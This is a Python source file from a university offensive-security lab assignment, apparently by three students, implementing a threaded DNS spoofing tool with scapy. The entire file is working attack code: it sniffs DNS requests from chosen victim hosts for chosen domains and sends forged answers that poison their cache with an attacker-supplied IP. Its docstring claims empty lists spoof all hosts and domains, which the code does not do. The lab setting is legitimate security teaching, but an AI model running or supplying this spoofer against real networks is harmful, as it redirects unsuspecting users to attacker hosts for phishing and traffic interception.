"""
Assignment for course 2IC80, Lab on Offensive Computer Security, at TU/e
Created by;
Daan Boelhouwers(1457152), d.boelhouwers@student.tue.nl
Richard Farla(1420380), r.farla@student.tue.nl
Ivar de Win(1406663), i.j.f.d.win@student.tue.nl
"""


from scapy import packet
from scapy.layers.dns import DNSRR, DNSQR, DNS
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import send, sniff
import threading


class DNSSpoofing(threading.Thread):

    def __init__(self, interface: str, domain_names: list, victims: list, redirect_ip: str):
        """
        Starts DNS spoofing in a background thread

            :param interface: interface on which DNS requests will be sniffed
            :param domain_names: list of the domain names to be spoofed, empty list means all domains will be spoofed
            :param victims: list of the hosts to be spoofed, empty list means all hosts will be spoofed
            :param redirect_ip: IP address that will be used to poison the DNS cache of spoofed hosts
        """
        super(DNSSpoofing, self).__init__()
        self.interface = interface
        self.domain_names = domain_names
        self.victims = victims
        self.redirect_ip = redirect_ip
        self._stop = threading.Event()

    def stop(self):
        self._stop.set()

    def is_stopped(self):
        return self._stop.isSet()

    def run(self):

        def dns_spoof(received_packet: packet) -> None:

            def create_spoofed_dns_answer(redirect_ip: str, sniffed_packet: packet) -> packet:
                """
                Creates a spoofed DNS answer packet

                    :param redirect_ip: IP that will be used to poison the cache of victim
                    :param sniffed_packet: DNS request packet requesting IP of spoofed domain sent by victim
                    :return: Spoofed DNS packet that can be used to poison DNS cache
                """

                # extract layers from sniffed packet
                req_ip = sniffed_packet[IP]
                req_udp = sniffed_packet[UDP]
                req_dns = sniffed_packet[DNS]
                req_dnsqr = sniffed_packet[DNSQR]

                # create spoofed response packet
                resp_ip = IP(src=req_ip.dst, dst=req_ip.src)
                resp_udp = UDP(sport=req_udp.dport, dport=req_udp.sport)
                resp_dnsrr = DNSRR(rrname=req_dnsqr.qname, rdata=redirect_ip)
                resp_dns = DNS(qr=1, id=req_dns.id,
                               qd=req_dnsqr, an=resp_dnsrr)
                spoofed_resp = resp_ip / resp_udp / resp_dns

                return spoofed_resp

            # Packet is a DNS request?
            if not (DNS in received_packet and received_packet[DNS].qr == 0):
                return
            # Packet destination a domain name that should be spoofed?
            if not (received_packet[DNSQR].qname.decode("utf8")[:-1] in self.domain_names):
                return
            # Packet sent by a target host?
            if not (received_packet[IP].src in self.victims):
                return

            spoofed_ans = create_spoofed_dns_answer(
                self.redirect_ip, received_packet)
            send(spoofed_ans, iface=self.interface, verbose=False)
            print(f"Spoofed DNS request sent by host {received_packet[IP].src} for "
                  f"{received_packet[DNSQR].qname.decode('utf8')[:-1]}")

        print("Now DNS spoofing...")
        while True:
            if self.is_stopped():
                print("Stopped DNS spoofing")
                return
            sniff(iface=self.interface, prn=dns_spoof,
                  filter="udp port 53", store=0, timeout=1)
